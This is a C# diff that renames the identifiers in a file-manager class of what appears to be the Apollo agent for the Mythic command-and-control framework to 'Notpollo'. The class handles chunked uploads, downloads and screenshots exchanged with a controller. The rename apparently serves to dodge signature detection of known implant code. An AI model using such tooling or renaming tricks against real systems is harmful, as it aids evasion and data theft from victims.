@@ -1,17 +1,17 @@
-﻿using ApolloInterop.Classes.Core;
-using ApolloInterop.Classes.Events;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+﻿using NotpolloInterop.Classes.Core;
+using NotpolloInterop.Classes.Events;
+using NotpolloInterop.Interfaces;
+using NotpolloInterop.Structs.MythicStructs;
 using System;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Threading;
-using ApolloInterop.Classes.Cryptography;
+using NotpolloInterop.Classes.Cryptography;
 using EncryptedFileStore;
 
-namespace Apollo.Management.Files
+namespace Notpollo.Management.Files
 {
     public sealed class FileManager : IFileManager
     {
@@ -110,18 +110,18 @@ namespace Apollo.Management.Files
 
         public void ProcessResponse(TaskStatus resp)
         {
-            if (_uploadMessageStore.ContainsKey(resp.ApolloTrackerUUID))
+            if (_uploadMessageStore.ContainsKey(resp.NotpolloTrackerUUID))
             {
                 // This is an upload message response, send it along.
-                if (resp.ChunkNumber > 0 && _uploadMessageStore.ContainsKey(resp.ApolloTrackerUUID))
+                if (resp.ChunkNumber > 0 && _uploadMessageStore.ContainsKey(resp.NotpolloTrackerUUID))
                 {
-                    _uploadMessageStore[resp.ApolloTrackerUUID].MessageStore.AddMessage(resp);
+                    _uploadMessageStore[resp.NotpolloTrackerUUID].MessageStore.AddMessage(resp);
                 }
             } else
             {
-                if (_downloadMessageStore.ContainsKey(resp.ApolloTrackerUUID))
+                if (_downloadMessageStore.ContainsKey(resp.NotpolloTrackerUUID))
                 {
-                    _downloadMessageStore[resp.ApolloTrackerUUID].AddMessage(resp);
+                    _downloadMessageStore[resp.NotpolloTrackerUUID].AddMessage(resp);
                 }
             }
         }
@@ -133,10 +133,10 @@ namespace Apollo.Management.Files
             {
                 data.AddRange(Convert.FromBase64String(e.Chunks[i].ChunkData));
             }
-            if (_uploadMessageStore.TryGetValue(e.Chunks[0].ApolloTrackerUUID, out UploadMessageTracker tracker))
+            if (_uploadMessageStore.TryGetValue(e.Chunks[0].NotpolloTrackerUUID, out UploadMessageTracker tracker))
             {
                 tracker.Data = data.ToArray();
-                _uploadMessageStore[e.Chunks[0].ApolloTrackerUUID] = tracker;
+                _uploadMessageStore[e.Chunks[0].NotpolloTrackerUUID] = tracker;
                 tracker.Complete.Set();
             }
         }
@@ -164,7 +164,7 @@ namespace Apollo.Management.Files
                     IsScreenshot = isScreenshot,
                     TaskID = taskID,
                 },
-                ApolloTrackerUUID = uuid
+                NotpolloTrackerUUID = uuid
             };
             _agent.GetTaskManager()?.AddTaskResponseToQueue(resp);
             WaitHandle.WaitAny(new WaitHandle[]
@@ -199,7 +199,7 @@ namespace Apollo.Management.Files
                     ChunkNumber = 1,
                     ChunkSize = _chunkSize
                 },
-                ApolloTrackerUUID = uuid
+                NotpolloTrackerUUID = uuid
             });
             WaitHandle.WaitAny(new WaitHandle[]
             {
@@ -233,7 +233,7 @@ namespace Apollo.Management.Files
                     ChunkNumber = msg.ChunkNumber + 1,
                     ChunkSize = _chunkSize
                 },
-                ApolloTrackerUUID = msg.ApolloTrackerUUID
+                NotpolloTrackerUUID = msg.NotpolloTrackerUUID
             });
         }
 
@@ -250,7 +250,7 @@ namespace Apollo.Management.Files
                     ChunkData = Convert.ToBase64String(tracker.Chunks[tracker.ChunksSent]),
                     TaskID = e.Chunks[0].TaskID
                 },
-                ApolloTrackerUUID = e.Chunks[0].ApolloTrackerUUID
+                NotpolloTrackerUUID = e.Chunks[0].NotpolloTrackerUUID
             });
         }
 
